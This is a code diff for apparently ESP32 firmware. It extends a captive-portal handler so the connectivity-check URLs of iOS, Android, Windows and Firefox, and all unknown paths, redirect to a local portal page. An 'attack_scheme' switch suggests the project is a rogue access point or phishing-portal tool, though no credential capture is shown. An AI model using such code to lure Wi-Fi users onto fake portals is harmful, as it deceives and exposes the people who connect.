@@ -108,12 +108,14 @@ static void ws_frame_process_task(void *pvParameter)
 
 static esp_err_t captive_portal_redirect(httpd_req_t *req)
 {
+	ESP_LOGD(TAG, "Captive portal captured url: %s", req->uri);
 	const char *portal_url = "http://192.168.4.1/";
 	httpd_resp_set_status(req, "302 Found");
 	//httpd_resp_set_hdr(req, "Host", host);
 	httpd_resp_set_hdr(req, "Location", portal_url);
-	httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
-	httpd_resp_set_hdr(req, "Content-Length", "0");
+	httpd_resp_set_hdr(req, "Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
+	httpd_resp_set_hdr(req, "Pragma", "no-cache");
+	httpd_resp_set_hdr(req, "Connection", "close");
 	httpd_resp_send(req, NULL, 0);
 	return ESP_OK;
 }
@@ -197,6 +199,7 @@ static esp_err_t redirect_handler(httpd_req_t *req)
 	const char *uri = req->uri;
 
 	/* Redirect to captive portal */
+	// Apple / iOS / macOS
 	if(strcmp(uri, "/hotspot-detect.html") == 0 ) {
 		captive_portal_redirect(req);
 		return ESP_OK;
@@ -205,18 +208,34 @@ static esp_err_t redirect_handler(httpd_req_t *req)
 		captive_portal_redirect(req);
 		return ESP_OK;
 	}
+
+	// Android / ChromeOS
 	else if(strcmp(uri, "/generate_204") == 0 ) {
 		captive_portal_redirect(req);
 		return ESP_OK;
 	}
+	else if(strcmp(uri, "/gen_204") == 0 ) {
+		captive_portal_redirect(req);
+		return ESP_OK;
+	}
+
+	// Windows 10 / 11 (MSFT Connect Test)
 	else if(strcmp(uri, "/connecttest.txt") == 0 ) {
 		captive_portal_redirect(req);
 		return ESP_OK;
 	}
+	else if(strcmp(uri, "/redirect") == 0 ) {
+		captive_portal_redirect(req);
+		return ESP_OK;
+	}
+
+	// Windows 7 / 8 / vecchie versioni (NCSI)
 	else if(strcmp(uri, "/ncsi.txt") == 0 ) {
 		captive_portal_redirect(req);
 		return ESP_OK;
 	}
+
+	// Varianti Firefox, Ubuntu, ecc.
 	else if(strcmp(uri, "/check_network_status.txt") == 0 ) {
 		captive_portal_redirect(req);
 		return ESP_OK;
@@ -225,10 +244,10 @@ static esp_err_t redirect_handler(httpd_req_t *req)
 		captive_portal_redirect(req);
 		return ESP_OK;
 	}
-	else if(strcmp(uri, "/redirect") == 0 ) {
-		captive_portal_redirect(req);
-		return ESP_OK;
-	}
+	else if(strncmp(uri, "/success.txt", 12) == 0 ) {
+        captive_portal_redirect(req);
+        return ESP_OK;
+    }
 	
     if (strcmp(uri, "/") == 0) { 
 		switch(attack_scheme)
@@ -281,8 +300,9 @@ static esp_err_t redirect_handler(httpd_req_t *req)
             }
         }
 
-        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "Not found");
-        return ESP_OK; 
+		return captive_portal_redirect(req);
+        //httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "Not found");
+        //return ESP_OK; 
     }
 
     httpd_resp_set_type(req, mime_from_path(filepath));
